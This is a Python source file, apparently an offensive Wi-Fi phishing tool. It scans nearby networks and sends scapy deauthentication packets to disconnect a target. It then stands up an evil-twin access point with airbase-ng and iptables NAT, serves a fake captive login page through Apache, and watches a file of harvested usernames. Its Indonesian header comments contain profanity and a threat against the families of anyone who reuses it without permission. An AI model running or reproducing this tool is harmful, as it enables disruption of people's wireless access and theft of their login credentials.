# Harus Menggunakan Kali Linux ataupun sejenisnya
# Ingat Kontol kalau mau dikembangkan izin dulu ya
# Yang tidak izin maka mati keluarga nya
# Sulawesi Cyber Team
import os
import time
import subprocess
import re
from scapy.all import *
from termcolor import colored
from pyfiglet import Figlet

def display_banner(text):
    f = Figlet(font='slant')
    print(colored(f.renderText(text), 'red'))

def scan_wifi_networks(interface):
    display_banner("WiFi Scanner")
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")
    networks = []
    print(colored("Scanning for available Wi-Fi networks...", "cyan"))
    result = subprocess.run(["iwlist", interface, "scan"], capture_output=True, text=True)
    cells = result.stdout.split("Cell")
    for cell in cells[1:]:
        ssid = re.search(r'ESSID:"(.*?)"', cell)
        if ssid:
            networks.append(ssid.group(1))
    return networks

def deauth_attack(target_mac, gateway_mac, interface):
    display_banner("Deauth Attack")
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    print(colored("Launching deauthentication attack...", "red"))
    send(packet, inter=0.1, count=100, iface=interface, verbose=1)

def create_evil_twin(ssid, interface):
    display_banner("Twin Setup")
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")
    os.system(f"airbase-ng -e {ssid} -c 11 {interface} &")
    time.sleep(5)
    os.system("ifconfig at0 up")
    os.system("ifconfig at0 10.0.0.1 netmask 255.255.255.0")
    os.system("route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE")
    os.system("iptables --append FORWARD --in-interface at0 -j ACCEPT")
    print(colored(f"twin access point '{ssid}' created!", "green"))

def captive_portal():
    display_banner("Captive Portal")
    os.system("service apache2 start")
    os.system("cp -r Login_Page/* /var/www/html/")
    print(colored("Captive portal is live!", "yellow"))

def capture_credentials():
    display_banner("Credential Capture")
    print(colored("Waiting for credentials...", "magenta"))
    os.system("tail -f /var/www/html/usernames.txt")

def display_menu():
    display_banner("Menu")
    print(colored("1. Play", "blue"))
    print(colored("2. About", "blue"))
    print(colored("3. Exit", "blue"))

def display_about():
    display_banner("About")
    print(colored("WiFiPhisher Tool", "yellow"))
    print(colored("Created by: Mr.4Rex_503 Dark Connection", "yellow"))
    print(colored("Usage: Follow the menu to perform a Wi-Fi phishing attack.", "yellow"))
    input(colored("Press Enter to return to the menu...", "cyan"))

def main():
    interface = "wlan0mon"  # Wireless interface

    while True:
        display_menu()
        choice = input("Enter your choice: ")

        if choice == '1':
            networks = scan_wifi_networks(interface)
            print(colored("Available Wi-Fi networks:", "blue"))
            for i, network in enumerate(networks, start=1):
                print(f"{i}. {colored(network, 'white', 'on_blue')}")

            choice = int(input("Enter the number of the network to target: ")) - 1
            target_ssid = networks[choice]
            target_mac = "00:11:22:33:44:55"  # Replace with actual target MAC
            gateway_mac = "66:77:88:99:AA:BB"  # Replace with actual gateway MAC

            deauth_attack(target_mac, gateway_mac, interface)
            create_evil_twin(target_ssid, interface)
            captive_portal()
            capture_credentials()

        elif choice == '2':
            display_about()

        elif choice == '3':
            print(colored("Exiting...", "red"))
            break

        else:
            print(colored("Invalid choice. Please try again.", "red"))

if __name__ == "__main__":
    main()
